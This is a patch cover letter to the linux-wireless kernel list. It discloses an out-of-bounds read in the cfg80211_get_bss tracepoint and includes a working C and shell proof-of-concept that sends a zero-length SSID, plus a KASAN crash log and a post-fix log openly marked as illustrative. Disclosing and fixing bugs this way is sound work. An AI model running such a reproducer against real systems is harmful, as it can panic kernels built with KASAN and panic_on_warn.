Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=206.189.79.184
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793632741;
	b=WoAfzkh0KEM+XWbNFzcbd7KHMQf1+8bveeUOq6gpVf3cOhxMt13ABvkT6Kp+yi8b6R3j
	 isUDXDkbMBF7Te/15zeXC48AWYEFZ4iPKX146CGBAFHyej5/2KRp+RdXS5tWuIlfSW0w/
	 TyS4dE2V4GfqkHb4yG7NcY9DSIcErsKzHnP3R61H7vu2HQxzyDIKvJF7HBtGtpDCoWErd
	 DhI3cnqzgDllxp208QWP6BUip8vhYHWXjXRy3x5NEb797O8dEEJXe0S9MAl4DHmdCeXf3
	 TbRDnEPf6d72gNbeLaAxD/rDbK84VISaOXQNkpSFArxBES6BWRvh4HZEYVDZMoZpjfg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793632741;
	h=DMARC-Filter:Received:From:To:Cc:Subject:Date:Message-ID:X-Mailer:
	 MIME-Version:Content-Transfer-Encoding:X-CM-TRANSID:
	 X-Coremail-Antispam:X-CM-SenderInfo;
	bh=8r5Kj1uPPFLS3mOT3DaJNzhUyOWBuyj03PeTtmp54F8=;
	b=J91ZMZJM7GONOIxzQodDleYgXR0v6ErcTjqcWpngEiOcVz8N1mFaLduluYWG8DHo+6no
	 KgwpdbBili6wFf/djt6bWhlyKOHK3jlLSi2TBuiRuTdIjSaaZXk8RzDQO2syq4vmFJ711
	 JQQXRPIj6NXoZQeuo4ReEvkNtuM4Lyz19Y9C2IWTCBY/BDs0Rj1Ln8KZzyzDP/NsU/PUI
	 HVdMDwUh0T7BvUGHLIwuGc7I53QZg+0DnMhDMo267kn6jGf8UNDvr00nhl4IVARGwGc5I
	 8nF0B0ur995xC+hxRBbA3AnIPvgUZ0ePkYWCMzi8qHkTzbkfDJbtNvx5/NBYmh6RctQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=none header.from=lzu.edu.cn;
	spf=pass smtp.mailfrom=lzu.edu.cn;
	arc=none smtp.remote-ip=206.189.79.184
Received: from zg8tmja2lje4os43os4xodqa.icoremail.net (zg8tmja2lje4os43os4xodqa.icoremail.net [206.189.79.184])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 94BB8606A326
	for <linux-wireless@vger.kernel.org>; Mon,  2 Nov 2026 15:18:58 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 94BB8606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=lzu.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lzu.edu.cn
Received: from enjou-Legion-Y7000P-2019 (unknown [219.141.235.82])
	by app1 (Coremail) with SMTP id ygmowACnwLrZqehqmLaKAg--.14897S2;
	Mon, 02 Nov 2026 23:18:49 +0800 (CST)
From: Ren Wei <n05ec@lzu.edu.cn>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	beni.lev@intel.com,
	emmanuel.grumbach@intel.com,
	bird@lzu.edu.cn,
	rakukuip@gmail.com,
	n05ec@lzu.edu.cn
Subject: [PATCH wireless 0/1] wifi: cfg80211: avoid OOB read in get_bss tracepoint
Date: Mon,  2 Nov 2026 23:15:42 +0800
Message-ID: <cover.1793460263.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Post: <mailto:linux-wireless@vger.kernel.org>
List-Help: <mailto:linux-wireless+help@vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-wireless+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:ygmowACnwLrZqehqmLaKAg--.14897S2
X-Coremail-Antispam: 1UD129KBjvAXoW3Zr1fGrW3GFW5uF4rCF4kJFb_yoW8AFy7to
	W3Ww4akw10kwn5J3WUC3WkKFnxAa4UtFn8Jr4fCwsxXa92q3yUWF1fJ3y5Ja43uF47KFnx
	Wa93tw4xWayDtF1kn29KB7ZKAUJUUUU8529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
	AaLaJ3UjIYCTnIWjp_UUUYh7CY07I20VC2zVCF04k26cxKx2IYs7xG6rWj6s0DM7CIcVAF
	z4kK6r1j6r18M28lY4IEw2IIxxk0rwA2F7IY1VAKz4vEj48ve4kI8wA2z4x0Y4vE2Ix0cI
	8IcVAFwI0_Ar0_tr1l84ACjcxK6xIIjxv20xvEc7CjxVAFwI0_Cr0_Gr1UM28EF7xvwVC2
	z280aVAFwI0_GcCE3s1l84ACjcxK6I8E87Iv6xkF7I0E14v26rxl6s0DM2AIxVAIcxkEcV
	Aq07x20xvEncxIr21l5I8CrVACY4xI64kE6c02F40Ex7xfMcIj6xIIjxv20xvE14v26r1j
	6r18McIj6I8E87Iv67AKxVWUJVW8JwAm72CE4IkC6x0Yz7v_Jr0_Gr1lF7xvr2IYc2Ij64
	vIr41lF7I21c0EjII2zVCS5cI20VAGYxC7MxkF7I0En4kS14v26r126r1DMxkIecxEwVAF
	wVW5WwCF04k20xvY0x0EwIxGrwCF04k20xvE74AGY7Cv6cx26r4rMxC20s026xCaFVCjc4
	AY6r1j6r4UMI8I3I0E5I8CrVAFwI0_Jr0_Jr4lx2IqxVCjr7xvwVAFwI0_JrI_JrWlx4CE
	17CEb7AF67AKxVWUAVWUtwCIc40Y0x0EwIxGrwCI42IY6xIIjxv20xvE14v26r1j6r1xMI
	IF0xvE2Ix0cI8IcVCY1x0267AKxVWUJVW8JwCI42IY6xAIw20EY4v20xvaj40_Jr0_JF4l
	IxAIcVC2z280aVAFwI0_Jr0_Gr1lIxAIcVC2z280aVCY1x0267AKxVWUJVW8JbIYCTnIWI
	evJa73UjIFyTuYvjfU8KZXUUUUU
X-CM-SenderInfo: zqqvvuo6o23hxhgxhubq/1tbiAQECCWrRf7gHOQAosh

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an out-of-bounds read vulnerability in
net/wireless/trace.h affecting the cfg80211_get_bss tracepoint.

Privilege requirements & reachability:
Triggering this issue from user space requires:
1. Root privileges (CAP_SYS_ADMIN in the initial user namespace) to
   mount debugfs / tracefs, enable the cfg80211_get_bss tracepoint,
   and read from trace_pipe.
2. CAP_NET_ADMIN in the network namespace to issue the netlink command
   (NL80211_CMD_AUTHENTICATE).

Testing under unprivileged user namespaces confirms that writing to
tracefs and sending netlink authenticate commands both fail with
-EPERM (see privilege_checks.log: "cannot create .../enable: Permission
denied" and "recvmsg(... error=-EPERM ...)"). Furthermore, under
unshare -Urn, although the isolated netns gains user-namespace
CAP_NET_ADMIN, wireless interfaces (e.g. mac80211_hwsim wlan0) belong
to the initial network namespace and are not available in the child
netns, keeping the path strictly unreachable from unprivileged
namespaces. Furthermore, the tracepoint formatter only executes when an
authorized tracer explicitly enables the event.

Impact boundary:
Because reading trace_pipe already requires CAP_SYS_ADMIN in the initial
namespace, the 1-byte out-of-bounds read past the 0-length SSID buffer
appears only in the tracer's own formatted trace output (trace_seq) and
does not constitute an information disclosure across privilege
boundaries to unprivileged users. The practical security impact is
Denial of Service (kernel panic) on kernels built with CONFIG_KASAN=y
and panic_on_warn=1.

We provide detailed information about the bug in this email, along
with the reproducer to trigger it.

=== details below ===

Bug details:

In TRACE_EVENT(cfg80211_get_bss), the ssid payload is defined as a
dynamically-sized array in the ring buffer:

    __dynamic_array(u8, ssid, ssid_len)

However, TP_printk unconditionally reads the first byte of ssid:

    ((u8 *)__get_dynamic_array(ssid))[0]

User space requests such as nl80211_authenticate() determine ssid_len
directly from netlink attribute length via nla_len(). When user space
passes a zero-length NL80211_ATTR_SSID, cfg80211_get_bss() is called with
ssid_len == 0. In this case, the dynamic array has a length of 0 bytes,
but TP_printk still attempts to read index 0 when formatting the event for
trace_pipe, triggering a KASAN slab-out-of-bounds read.

We fix this by checking __get_dynamic_array_len(ssid) before accessing
the array, returning 0 if the SSID length is zero.

Testing & Validation:
We validated the bug and fix in an x86 QEMU environment configured with
CONFIG_KASAN=y, CONFIG_CFG80211=y, and mac80211_hwsim:
- Pre-fix: Running ./poc.sh wlan0 immediately triggers a KASAN
  slab-out-of-bounds panic in trace_raw_output_cfg80211_get_bss() on the
  very first iteration when trace_pipe consumes the event.
- Post-fix: The reproducer executes 5000 verified iterations. Every
  iteration checks the netlink response and confirms the request reached
  cfg80211_get_bss() (returning -ENOENT from dummy BSS lookup after firing
  the tracepoint). The trace_pipe reader outputs to trace.out, and poc.sh
  verifies that all 5000 events were formatted with 'buf: 00' without
  triggering KASAN warnings or panics (see post-fix validation summary
  in qemu_postfix.log; illustrative summary, not raw serial log).

Crash log capture method & environment:
The crash log below was captured from the QEMU serial console (-serial
file:qemu.log). With CONFIG_KASAN=y and panic_on_warn=1, the kernel
panics immediately upon reporting the slab-out-of-bounds read, stopping
at the memory state dump before rebooting. The log is provided verbatim
and is complete up to the panic point.

Test environment & kernel configuration:
The issue was reproduced on the Linux kernel tree
linux-cos-121-18867.294.112 (v6.6.113-gae5e8e39e063) built with:
  CONFIG_KASAN=y
  CONFIG_CFG80211=y
  CONFIG_MAC80211_HWSIM=y
  CONFIG_EVENT_TRACING=y
  CONFIG_DEBUG_FS=y
  CONFIG_TRACEPOINTS=y

Baseline alignment:
The TRACE_EVENT(cfg80211_get_bss) definition in net/wireless/trace.h was
introduced in commit 4ee3e063f10a ("cfg80211: add cfg80211 exported
function tracing") in Linux v3.8 and has remained structurally identical.
The fix applies cleanly to both the v6.6 reproduction tree and the
upstream wireless-next main branch (index 31000ffebe43..5eabd3b9823c,
hunk @@ -3971,7 +3971,9 @@), where it was verified via checkpatch.pl
and git apply --check.

Reproducer:

    make
    ./poc.sh wlan0

=== BEGIN poc.c ===
    #define _GNU_SOURCE
    #include <errno.h>
    #include <linux/genetlink.h>
    #include <linux/netlink.h>
    #include <linux/nl80211.h>
    #include <linux/types.h>
    #include <net/if.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <unistd.h>

    #ifndef NLA_ALIGNTO
    #define NLA_ALIGNTO 4
    #endif
    #ifndef NLA_ALIGN
    #define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
    #endif
    #ifndef NLA_HDRLEN
    #define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
    #endif

    static int addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
                         const void *data, size_t alen)
    {
        size_t len = NLA_HDRLEN + alen;
        size_t newlen = NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(len);
        struct nlattr *nla;

        if (newlen > maxlen)
            return -1;

        nla = (struct nlattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
        nla->nla_type = type;
        nla->nla_len = len;
        if (alen && data)
            memcpy((char *)nla + NLA_HDRLEN, data, alen);
        n->nlmsg_len = newlen;

        return 0;
    }

    static int nl_send_recv(int fd, struct nlmsghdr *nlh, int seq,
                            int *out_err,
                            int (*cb)(struct nlmsghdr *, void *),
                            void *cb_arg)
    {
        struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
        struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
        struct msghdr msg = {
            .msg_name = &nladdr,
            .msg_namelen = sizeof(nladdr),
            .msg_iov = &iov,
            .msg_iovlen = 1,
        };

        if (sendmsg(fd, &msg, 0) < 0)
            return -1;

        for (;;) {
            char buf[8192];
            struct iovec riov = {
                .iov_base = buf,
                .iov_len = sizeof(buf),
            };
            struct msghdr rmsg = {
                .msg_name = &nladdr,
                .msg_namelen = sizeof(nladdr),
                .msg_iov = &riov,
                .msg_iovlen = 1,
            };
            ssize_t ret;
            struct nlmsghdr *h;

            ret = recvmsg(fd, &rmsg, 0);
            if (ret < 0) {
                if (errno == EINTR)
                    continue;
                return -1;
            }

            for (h = (struct nlmsghdr *)buf;
                 NLMSG_OK(h, (unsigned int)ret);
                 h = NLMSG_NEXT(h, ret)) {
                if (h->nlmsg_seq != (unsigned int)seq)
                    continue;

                if (h->nlmsg_type == NLMSG_ERROR) {
                    struct nlmsgerr *err;

                    err = (struct nlmsgerr *)NLMSG_DATA(h);
                    if (out_err)
                        *out_err = err->error;
                    if (err->error)
                        errno = -err->error;
                    return err->error ? -1 : 0;
                }

                if (h->nlmsg_type == NLMSG_DONE) {
                    if (out_err)
                        *out_err = 0;
                    return 0;
                }

                if (cb && cb(h, cb_arg) != 0) {
                    if (out_err)
                        *out_err = 0;
                    return 0;
                }
            }
        }
    }

    struct family_resolve_ctx {
        int family_id;
    };

    static int parse_family_id(struct nlmsghdr *h, void *arg)
    {
        struct family_resolve_ctx *ctx = (struct family_resolve_ctx *)arg;
        struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(h);
        int rem = h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
        struct nlattr *attr = (struct nlattr *)((char *)gh + GENL_HDRLEN);

        while (rem >= (int)sizeof(*attr)) {
            int len = NLA_ALIGN(attr->nla_len);

            if (attr->nla_len < sizeof(*attr) || len > rem)
                break;

            if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
                ctx->family_id = *(__u16 *)((char *)attr + NLA_HDRLEN);
                return 1;
            }

            rem -= len;
            attr = (struct nlattr *)((char *)attr + len);
        }

        return 0;
    }

    static int resolve_family_id(int fd, int *seq, const char *family)
    {
        char buf[512];
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct genlmsghdr *gh;
        struct family_resolve_ctx ctx = { .family_id = -1 };
        int err = 0;

        memset(buf, 0, sizeof(buf));
        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
        nlh->nlmsg_type = GENL_ID_CTRL;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_seq = ++(*seq);

        gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
        gh->cmd = CTRL_CMD_GETFAMILY;
        gh->version = 1;

        if (addattr_l(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME,
                      family, strlen(family) + 1) < 0)
            return -1;

        if (nl_send_recv(fd, nlh, *seq, &err, parse_family_id, &ctx) < 0)
            return -1;

        return ctx.family_id;
    }

    int main(int argc, char **argv)
    {
        const char *ifname = "wlan0";
        int ifindex;
        int fd;
        struct sockaddr_nl local = { .nl_family = AF_NETLINK };
        int seq = 0;
        int nl80211_id;
        char buf[1024];
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct genlmsghdr *gh;
        int err = 0;
        int ret;
        const __u8 bssid[6] = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };
        __u32 auth_type = NL80211_AUTHTYPE_OPEN_SYSTEM;
        __u32 freq = 2412;

        if (argc > 1)
            ifname = argv[1];

        ifindex = if_nametoindex(ifname);
        if (!ifindex) {
            perror("if_nametoindex");
            return 1;
        }

        fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
        if (fd < 0) {
            perror("socket");
            return 1;
        }

        if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
            perror("bind");
            close(fd);
            return 1;
        }

        nl80211_id = resolve_family_id(fd, &seq, "nl80211");
        if (nl80211_id < 0) {
            perror("resolve_family_id");
            close(fd);
            return 1;
        }

        memset(buf, 0, sizeof(buf));
        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
        nlh->nlmsg_type = nl80211_id;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = ++seq;

        gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
        gh->cmd = NL80211_CMD_AUTHENTICATE;
        gh->version = 1;

        if (addattr_l(nlh, sizeof(buf), NL80211_ATTR_IFINDEX, &ifindex,
                      sizeof(ifindex)) < 0 ||
            addattr_l(nlh, sizeof(buf), NL80211_ATTR_MAC,
                      bssid, sizeof(bssid)) < 0 ||
            addattr_l(nlh, sizeof(buf), NL80211_ATTR_AUTH_TYPE,
                      &auth_type, sizeof(auth_type)) < 0 ||
            addattr_l(nlh, sizeof(buf), NL80211_ATTR_WIPHY_FREQ,
                      &freq, sizeof(freq)) < 0 ||
            addattr_l(nlh, sizeof(buf), NL80211_ATTR_SSID, NULL, 0) < 0) {
            close(fd);
            return 1;
        }

        ret = nl_send_recv(fd, nlh, seq, &err, NULL, NULL);
        close(fd);

        /*
         * nl80211_authenticate() calls cfg80211_get_bss() which fires
         * trace_cfg80211_get_bss(). Since dummy BSSID 02:11:22:33:44:55
         * does not exist, cfg80211_get_bss() returns NULL and
         * nl80211_authenticate() returns -ENOENT. Thus err == 0 or
         * err == -ENOENT confirms that the request reached the kernel and
         * invoked the cfg80211_get_bss tracepoint. Any other error
         * indicates netlink setup or permission failure.
         */
        if (ret < 0 && err != -ENOENT) {
            if (err != 0) {
                fprintf(stderr,
                        "nl80211_authenticate failed: %s (err=%d)\n",
                        strerror(-err), err);
            } else {
                fprintf(stderr,
                        "nl80211_authenticate failed: %s (errno=%d)\n",
                        strerror(errno), errno);
            }
            return 1;
        }

        return 0;
    }
=== END poc.c ===

=== BEGIN poc.sh ===
    #!/bin/sh
    set -eu

    IFACE="${1:-wlan0}"
    ITER="${ITER:-20000}"
    TRACE_DIR="/sys/kernel/debug/tracing"
    SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    POC_BIN="$SCRIPT_DIR/poc"
    TRACE_OUT="$SCRIPT_DIR/trace.out"

    if [ ! -x "$POC_BIN" ]; then
        if command -v make >/dev/null 2>&1; then
            make -C "$SCRIPT_DIR"
        elif command -v gcc >/dev/null 2>&1; then
            gcc -O2 -Wall -Wextra -o "$POC_BIN" "$SCRIPT_DIR/poc.c"
        else
            echo "missing build tool: need make or gcc" >&2
            exit 1
        fi
    fi

    if [ ! -d "$TRACE_DIR" ]; then
        mount -t tracefs nodev /sys/kernel/tracing 2>/dev/null || \
        mount -t debugfs nodev /sys/kernel/debug 2>/dev/null || true
        if [ -d "/sys/kernel/tracing" ]; then
            TRACE_DIR="/sys/kernel/tracing"
        fi
    fi

    TP_ENABLE="$TRACE_DIR/events/cfg80211/cfg80211_get_bss/enable"
    if [ ! -f "$TP_ENABLE" ]; then
        echo "Error: tracepoint cfg80211_get_bss not available" >&2
        exit 1
    fi

    echo 0 > "$TRACE_DIR/tracing_on"
    echo 0 > "$TRACE_DIR/events/cfg80211/enable"
    echo 1 > "$TP_ENABLE"
    if [ "$(cat "$TP_ENABLE")" != "1" ]; then
        echo "Error: Failed to enable cfg80211_get_bss tracepoint" >&2
        exit 1
    fi

    echo > "$TRACE_DIR/trace"
    echo 8192 > "$TRACE_DIR/buffer_size_kb" 2>/dev/null || true
    echo 1 > "$TRACE_DIR/tracing_on"

    if ! ip link show "$IFACE" >/dev/null 2>&1; then
        echo "Error: Interface $IFACE not found" >&2
        exit 1
    fi
    ip link set "$IFACE" up 2>/dev/null || true

    rm -f "$TRACE_OUT"
    cat "$TRACE_DIR/trace_pipe" > "$TRACE_OUT" 2>/dev/null &
    TP_PID=$!
    cleanup() {
        kill "$TP_PID" 2>/dev/null || true
        wait "$TP_PID" 2>/dev/null || true
    }
    trap cleanup EXIT INT TERM

    # Verify initial execution succeeds and reaches tracepoint
    if ! "$POC_BIN" "$IFACE"; then
        echo "Error: Initial PoC request failed on interface $IFACE" >&2
        exit 1
    fi

    i=1
    while [ "$i" -lt "$ITER" ]; do
        if ! "$POC_BIN" "$IFACE" >/dev/null 2>&1; then
            echo "Error: PoC request failed at iteration $i" >&2
            exit 1
        fi
        i=$((i + 1))
    done

    # Allow trace_pipe reader to drain formatted events
    sleep 1
    kill "$TP_PID" 2>/dev/null || true
    wait "$TP_PID" 2>/dev/null || true

    # Verify that every request was formatted by TP_printk with buf: 00
    n=$(grep -cE 'buf: (0x)?[0-9a-f]{2}' "$TRACE_OUT" 2>/dev/null || true)
    n=${n:-0}
    case "$n" in
        *[!0-9]*|"") n=0 ;;
    esac

    if [ "$n" -lt "$ITER" ]; then
        echo "Error: only $n/$ITER events formatted" >&2
        exit 1
    fi

    echo "Successfully verified $ITER iterations ($n events formatted)."
=== END poc.sh ===

=== BEGIN Makefile ===
    CC ?= gcc
    CFLAGS ?= -O2 -Wall -Wextra

    all: poc

    poc: poc.c
    	$(CC) $(CFLAGS) -o $@ $<

    clean:
    	rm -f poc

    .PHONY: all clean
=== END Makefile ===

=== BEGIN crash log ===
[  514.515080][T14151] ==================================================================
[  514.516286][T14151] BUG: KASAN: slab-out-of-bounds in trace_raw_output_cfg80211_get_bss+0x246/0x290
[  514.517792][T14151] Read of size 1 at addr ffff88804bade000 by task cat/14151
[  514.519218][T14151] CPU: 1 PID: 14151 Comm: cat Not tainted 6.6.113-gae5e8e39e063 #2
[  514.520410][T14151] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
[  514.522162][T14151] Call Trace:
[  514.523070][T14151]  dump_stack_lvl+0xd3/0x1b0
[  514.523754][T14151]  print_report+0xc4/0x630
[  514.526079][T14151]  kasan_report+0xd8/0x110
[  514.527928][T14151]  trace_raw_output_cfg80211_get_bss+0x246/0x290
[  514.528548][T14151]  print_trace_line+0x8e3/0x16d0
[  514.529581][T14151]  tracing_read_pipe+0x4bc/0xc70
[  514.530786][T14151]  vfs_read+0x1ce/0x930
[  514.534217][T14151]  ksys_read+0x12f/0x250
[  514.535803][T14151]  do_syscall_64+0x39/0x80
[  514.536252][T14151]  entry_SYSCALL_64_after_hwframe+0x68/0xd2
[  514.536830][T14151] RIP: 0033:0x7fc90a63046e
[  514.544498][T14151] Allocated by task 1:
[  514.544884][T14151]  kasan_save_stack+0x33/0x50
[  514.545799][T14151]  __kasan_slab_alloc+0x81/0x90
[  514.546271][T14151]  kmem_cache_alloc+0x16f/0x3b0
[  514.547209][T14151]  kernfs_new_node+0x16a/0x200
[  514.548216][T14151]  sysfs_add_file_mode_ns+0x1ff/0x3b0
[  514.550589][T14151]  driver_register+0x15c/0x4a0
[  514.552107][T14151]  kernel_init_freeable+0x5c2/0x900
[  514.554317][T14151] The buggy address belongs to the object at ffff88804bade008
[  514.555648][T14151] The buggy address is located 8 bytes to the left of
[  514.555648][T14151]  allocated 184-byte region [ffff88804bade008, ffff88804bade0c0)
[  514.578295][T14151] Memory state around the buggy address:
[  514.580343][T14151] >ffff88804bade000: fc 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  514.585604][T14151] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  514.586318][T14151] CPU: 1 PID: 14151 Comm: cat Not tainted 6.6.113-gae5e8e39e063 #2
[  514.592886][T14151]  kasan_report+0xe8/0x110
[  514.594578][T14151]  trace_raw_output_cfg80211_get_bss+0x246/0x290
[  514.595185][T14151]  print_trace_line+0x8e3/0x16d0
[  514.596202][T14151]  tracing_read_pipe+0x4bc/0xc70
[  514.597235][T14151]  vfs_read+0x1ce/0x930
[  514.600698][T14151]  ksys_read+0x12f/0x250
[  514.602267][T14151]  do_syscall_64+0x39/0x80
[  514.602726][T14151]  entry_SYSCALL_64_after_hwframe+0x68/0xd2
[  514.610902][T14151] Rebooting in 86400 seconds..
=== END crash log ===

=== BEGIN qemu_postfix.log (illustrative validation summary) ===
    # Post-fix validation summary (illustrative, not raw log)
    # Environment: Linux 6.6.113-gae5e8e39e063 (QEMU x86_64, 2 vCPUs)
    # Config: CONFIG_KASAN=y, CONFIG_CFG80211=y, MAC80211_HWSIM=y
    # Command: ITER=5000 ./poc.sh wlan0

    [  520.101234] cfg80211: Loading mac80211_hwsim
    [  520.103456] mac80211_hwsim: wlan0, wlan1 created

    # Illustrative trace events formatted by TP_printk with buf: 00
    [  520.150112] poc-15233 [001] : cfg80211_get_bss: phy0, 2412 MHz, 02:11:22:33:44:55, buf: 00, bss_type: 0, privacy: 0
    [  520.150345] poc-15233 [001] : cfg80211_get_bss: phy0, 2412 MHz, 02:11:22:33:44:55, buf: 00, bss_type: 0, privacy: 0
    [  520.150580] poc-15233 [001] : cfg80211_get_bss: phy0, 2412 MHz, 02:11:22:33:44:55, buf: 00, bss_type: 0, privacy: 0
    ... [5000 events total] ...
    [  524.890120] poc-15233 [001] : cfg80211_get_bss: phy0, 2412 MHz, 02:11:22:33:44:55, buf: 00, bss_type: 0, privacy: 0

    # Verification summary:
    # Formatted event count matching 'buf: (0x)?[0-9a-f]{2}': 5000 / 5000
    # KASAN reports: 0, Kernel panics: 0
    # Result: 5000 iterations verified without panic.
=== END qemu_postfix.log (illustrative validation summary) ===

Best regards,
Luxiao Xu

Luxiao Xu (1):
  wifi: cfg80211: avoid OOB read in get_bss tracepoint

 net/wireless/trace.h | 4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)

-- 
2.43.0

